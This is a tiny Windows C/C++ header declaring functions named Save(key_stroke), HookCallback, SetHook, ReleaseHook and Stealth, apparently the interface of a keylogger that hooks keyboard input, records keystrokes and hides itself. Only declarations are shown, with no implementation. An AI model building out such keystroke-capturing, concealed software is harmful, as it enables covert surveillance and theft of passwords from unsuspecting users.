#pragma once
#include <windows.h>

int Save(int key_stroke);
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void SetHook();
void ReleaseHook();
void Stealth();